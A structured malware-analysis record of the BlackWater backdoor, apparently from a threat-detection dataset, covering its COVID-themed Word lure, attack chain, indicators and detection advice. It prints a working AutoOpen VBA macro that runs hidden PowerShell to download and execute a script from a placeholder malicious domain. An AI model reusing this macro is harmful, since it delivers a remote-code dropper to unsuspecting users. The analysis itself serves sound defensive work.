package_info.package_manager: N/A (malware distributed via weaponized Word document)
package_info.why_malicious: The BlackWater backdoor is distributed via spear-phishing campaigns using a weaponized Word document disguised as COVID-19 information. Upon macro enablement, it installs a backdoor that leverages Cloudflare Workers as its command-and-control (C2) infrastructure, enabling remote access, data exfiltration, and persistent control of infected systems.

execution_context.trigger: At document open, when the user enables macros
execution_context.file_location: Embedded macro within the weaponized Word document

malicious_snippets.code_snippet:
Sub AutoOpen()
  Dim objShell As Object
  Set objShell = CreateObject("Wscript.Shell")
  objShell.Run "cmd.exe /c powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1')"
End Sub
malicious_snippets.code_behavior: At document open, the macro executes by launching a hidden PowerShell process via cmd.exe, which downloads and executes a remote PowerShell script from a malicious domain, resulting in the delivery and execution of a secondary payload.

malice_analysis.why_suspicious: The macro abuses AutoOpen to trigger automatically, launching PowerShell to download and execute code from an external, untrusted domain. This is a well-known malware delivery technique that bypasses user awareness and leverages trusted applications for code execution.
malice_analysis.violated_expectations: Legitimate Word documents should not contain macros that execute system commands or download and run code from the internet. Macros are intended for document automation, not for launching external processes or fetching remote scripts.
malice_analysis.similar_legitimate_use: Enterprise environments may use macros for document automation, but they do not use them to execute PowerShell or download and run code from external sources.
key_indicators: AutoOpen macro triggers on document open
Use of Wscript.Shell to launch cmd.exe and PowerShell
Download and execution of remote PowerShell script from non-corporate domain
Hidden execution of PowerShell to evade user detection

execution_context.trigger: After the remote PowerShell payload is executed
execution_context.file_location: Downloaded PowerShell script (payload.ps1) in memory or temporary storage

malicious_snippets.code_behavior: At runtime, the PowerShell payload reads data from a local file (user.dat) in the user's APPDATA directory, then sends this data via an HTTPS POST request to a Cloudflare Workers endpoint acting as a C2 server, resulting in exfiltration of potentially sensitive user information.

malice_analysis.why_suspicious: The script exfiltrates local user data to a remote C2 server using a cloud service (Cloudflare Workers), which is a common tactic for backdoors and info-stealers to evade detection and blend with legitimate traffic.
malice_analysis.violated_expectations: Legitimate scripts should not access user data files and transmit their contents to external, non-corporate endpoints, especially via POST requests to cloud worker services.
malice_analysis.similar_legitimate_use: Cloud-based automation tools may use similar code for telemetry or legitimate data transfer, but not for exfiltrating user data to untrusted, non-corporate domains.
key_indicators: Use of Cloudflare Workers endpoint as C2 infrastructure
Reading and exfiltrating local user data (user.dat) from APPDATA
Outbound HTTPS POST requests to non-corporate domains immediately after payload execution
Access to environment variables to locate user-specific files

attack_chain.action: User opens the weaponized Word document and enables macros.
attack_chain.leads_to: Execution of the embedded malicious macro and initiation of the payload download process.

attack_chain.action: The macro launches a hidden PowerShell process to download and execute a remote script.
attack_chain.leads_to: Execution of the downloaded PowerShell backdoor payload.

attack_chain.action: The backdoor payload reads local user data and exfiltrates it to a Cloudflare Workers C2 endpoint.
attack_chain.leads_to: Attacker receives exfiltrated data and gains remote access/control over the infected system.

behavioral_signatures: Word document macros that invoke PowerShell or cmd.exe processes
PowerShell scripts that download and execute remote code from non-corporate domains
Hidden or background execution of PowerShell initiated by Office macros
Outbound HTTPS POST requests to Cloudflare Workers or similar cloud worker endpoints immediately after document open
Access to user data files in %APPDATA% followed by network exfiltration
file_indicators: Word documents containing embedded AutoOpen macros
Presence of suspicious scripts (e.g., payload.ps1) in temporary or user profile directories
Unexpected files such as user.dat in %APPDATA% or user profile directories
network_indicators: Connections to workers.cloudflare.com or other cloud worker endpoints
HTTP/HTTPS POST requests to non-corporate domains immediately following macro execution
Outbound traffic to domains not associated with the organization, especially after Office document activity
detection_knowledge.how_to_detect: Monitor for Office documents with embedded macros that invoke PowerShell or cmd.exe, particularly those that download and execute remote scripts. Detect and alert on outbound connections to Cloudflare Workers or similar cloud-based endpoints, especially POST requests containing user data. Flag unexpected file access and exfiltration patterns from user profile directories, and correlate these with recent Office document activity to identify potential compromise.
